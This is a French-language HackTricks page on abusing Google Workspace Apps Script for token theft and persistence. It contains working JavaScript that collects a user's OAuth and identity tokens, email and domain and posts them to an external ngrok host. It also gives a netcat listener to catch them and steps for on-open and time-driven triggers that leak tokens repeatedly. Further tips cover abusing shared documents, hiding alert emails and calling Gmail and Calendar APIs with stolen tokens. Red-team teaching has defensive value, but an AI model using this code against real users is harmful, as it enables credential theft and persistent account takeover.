# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts est **un code qui sera d√©clench√© lorsqu'un utilisateur ayant des droits d'√©diteur acc√®de au document auquel l'App Script est li√©** et apr√®s **avoir accept√© l'invite OAuth**.\
Ils peuvent √©galement √™tre configur√©s pour √™tre **ex√©cut√©s √† intervalles r√©guliers** par le propri√©taire de l'App Script (Persistance).

### Cr√©er un App Script

Il existe plusieurs fa√ßons de cr√©er un App Script, bien que les plus courantes soient **√† partir d'un Document Google (de tout type)** et en tant que **projet autonome** :

<details>

<summary>Cr√©er un projet li√© au conteneur √† partir de Google Docs, Sheets ou Slides</summary>

1. Ouvrez un document Docs, une feuille de calcul Sheets ou une pr√©sentation Slides.
2. Cliquez sur **Extensions** > **Google Apps Script**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome</summary>

Pour cr√©er un projet autonome √† partir d'Apps Script :

1. Allez sur [`script.google.com`](https://script.google.com/).
2. Cliquez sur **Nouveau projet**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome √† partir de Google Drive</summary>

1. Ouvrez [Google Drive](https://drive.google.com/).
2. Cliquez sur **Nouveau** > **Plus** > **Google Apps Script**.

</details>

<details>

<summary>Cr√©er un projet li√© au conteneur √† partir de Google Forms</summary>

1. Ouvrez un formulaire dans Google Forms.
2. Cliquez sur Plus more\_vert > **√âditeur de script**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome en utilisant l'outil de ligne de commande clasp</summary>

`clasp` est un outil de ligne de commande qui vous permet de cr√©er, tirer/pousser et d√©ployer des projets Apps Script depuis un terminal.

Consultez le [guide de l'interface de ligne de commande utilisant `clasp`](https://developers.google.com/apps-script/guides/clasp) pour plus de d√©tails.

</details>

## Sc√©nario App Script <a href="#create-using-clasp" id="create-using-clasp"></a>

### Cr√©er une feuille Google avec App Script

Commencez par cr√©er un App Script, ma recommandation pour ce sc√©nario est de cr√©er une feuille Google et d'aller √† **`Extensions > App Scripts`**, cela ouvrira un **nouveau App Script pour vous li√© √† la feuille**.

### Token de fuite

Pour donner acc√®s au token OAuth, vous devez cliquer sur **`Services +` et ajouter des scopes comme** :

* **AdminDirectory** : Acc√©der aux utilisateurs et groupes du r√©pertoire (si l'utilisateur a suffisamment de permissions)
* **Gmail** : Pour acc√©der aux donn√©es Gmail
* **Drive** : Pour acc√©der aux donn√©es Drive
* **Google Sheets API** : Pour que cela fonctionne avec le d√©clencheur

Pour changer vous-m√™me les **scopes n√©cessaires**, vous pouvez aller dans les param√®tres du projet et activer : **`Afficher le fichier manifeste "appsscript.json" dans l'√©diteur`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Pour capturer la requ√™te, vous pouvez simplement ex√©cuter :
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions demand√©es pour ex√©cuter le script d'application :

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Comme une demande externe est faite, l'invite OAuth **demandera √©galement la permission d'atteindre des points de terminaison externes**.
{% endhint %}

### Cr√©er un d√©clencheur

Une fois que l'application est lue, cliquez sur **‚è∞ D√©clencheurs** pour cr√©er un d√©clencheur. Comme **fonction** √† ex√©cuter, choisissez **`getToken`**, s'ex√©cute au d√©ploiement **`Head`**, dans la source d'√©v√©nement s√©lectionnez **`Depuis la feuille de calcul`** et le type d'√©v√©nement s√©lectionnez **`√Ä l'ouverture`** ou **`√Ä la modification`** (selon vos besoins) et enregistrez.

Notez que vous pouvez v√©rifier les **ex√©cutions des scripts d'application dans l'onglet Ex√©cutions** si vous souhaitez d√©boguer quelque chose.

### Partage

Pour **d√©clencher** le **script d'application**, la victime doit se connecter avec **Acc√®s √âditeur**.

{% hint style="success" %}
Le **jeton** utilis√© pour ex√©cuter le **script d'application** sera celui du **cr√©ateur du d√©clencheur**, m√™me si le fichier est ouvert en tant qu'√âditeur par d'autres utilisateurs.
{% endhint %}

### Abuser des documents Partag√©s avec Moi

{% hint style="danger" %}
Si quelqu'un **vous a partag√© un document avec des scripts d'application et un d√©clencheur utilisant le Head** du script d'application (pas un d√©ploiement fixe), vous pouvez modifier le code du script d'application (ajoutant par exemple les fonctions de vol de jeton), y acc√©der, et le **script d'application sera ex√©cut√© avec les permissions de l'utilisateur qui a partag√© le document avec vous** ! (notez que le jeton OAuth des propri√©taires aura comme port√©es d'acc√®s celles donn√©es lors de la cr√©ation du d√©clencheur).

Une **notification sera envoy√©e au cr√©ateur du script indiquant que quelqu'un a modifi√© le script** (Que diriez-vous d'utiliser les permissions Gmail pour g√©n√©rer un filtre afin de pr√©venir l'alerte ?)
{% endhint %}

{% hint style="success" %}
Si un **attaquant modifie les port√©es du script d'application**, les mises √† jour **ne seront pas appliqu√©es** au document tant qu'un **nouveau d√©clencheur** avec les modifications n'est pas cr√©√©. Par cons√©quent, un attaquant ne pourra pas voler le jeton du propri√©taire cr√©ateur avec plus de port√©es que celles qu'il a d√©finies dans le d√©clencheur qu'il a cr√©√©.
{% endhint %}

### Copier au lieu de partager

Lorsque vous cr√©ez un lien pour partager un document, un lien similaire √† celui-ci est cr√©√© : `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Si vous **changez** la fin **"/edit"** pour **"/copy"**, au lieu d'y acc√©der, Google vous demandera si vous souhaitez **g√©n√©rer une copie du document :**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Si l'utilisateur le copie et y acc√®de, √† la fois le **contenu du document et les scripts d'application seront copi√©s**, cependant les **d√©clencheurs ne le sont pas**, donc **rien ne sera ex√©cut√©**.

### Partager en tant qu'application Web

Notez qu'il est √©galement possible de **partager un script d'application en tant qu'application Web** (dans l'√©diteur du script d'application, d√©ployez en tant qu'application Web), mais une alerte comme celle-ci appara√Ætra :

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Suivie de l'**invite OAuth typique demandant** les permissions n√©cessaires.

### Test

Vous pouvez tester un jeton recueilli pour lister les e-mails avec :

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Liste des calendriers de l'utilisateur :
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script comme Persistance

Une option pour la persistance serait de **cr√©er un document et d'ajouter un d√©clencheur pour la fonction getToken** et de partager le document avec l'attaquant afin que chaque fois que l'attaquant ouvre le fichier, il **exfiltre le token de la victime.**

Il est √©galement possible de cr√©er un App Script et de le faire d√©clencher toutes les X minutes (comme chaque minute, heure, jour...). Un attaquant qui a **compromis des identifiants ou une session d'une victime pourrait d√©finir un d√©clencheur temporel pour un App Script et leak un token OAuth tr√®s privil√©gi√© chaque jour** :

Il suffit de cr√©er un App Script, d'aller dans D√©clencheurs, de cliquer sur Ajouter un d√©clencheur, et de s√©lectionner comme source d'√©v√©nement D√©clench√© par le temps et de choisir les options qui vous conviennent le mieux :

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Cela cr√©era un e-mail d'alerte de s√©curit√© et un message push sur votre mobile vous alertant √† ce sujet.
{% endhint %}

### Contournement de l'invite non v√©rifi√©e du document partag√©

De plus, si quelqu'un vous a **partag√©** un document avec un **acc√®s √©diteur**, vous pouvez g√©n√©rer des **App Scripts √† l'int√©rieur du document** et le **PROPRI√âTAIRE (cr√©ateur) du document sera le propri√©taire de l'App Script**.

{% hint style="warning" %}
Cela signifie que le **cr√©ateur du document appara√Ætra comme cr√©ateur de tout App Script** que quiconque avec un acc√®s √©diteur cr√©e √† l'int√©rieur.

Cela signifie √©galement que l'**App Script sera de confiance par l'environnement Workspace** du cr√©ateur du document.
{% endhint %}

{% hint style="danger" %}
Cela signifie √©galement que si un **App Script existait d√©j√†** et que des personnes ont **accord√© l'acc√®s**, quiconque ayant la permission **√âditeur** sur le document peut **le modifier et abuser de cet acc√®s.**\
Pour abuser de cela, vous avez √©galement besoin que des personnes d√©clenchent l'App Script. Et un astuce astucieuse est de **publier le script en tant qu'application web**. Lorsque les **personnes** qui ont d√©j√† accord√© **l'acc√®s** √† l'App Script acc√®dent √† la page web, elles **d√©clencheront l'App Script** (cela fonctionne √©galement en utilisant des balises `<img>`).
{% endhint %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
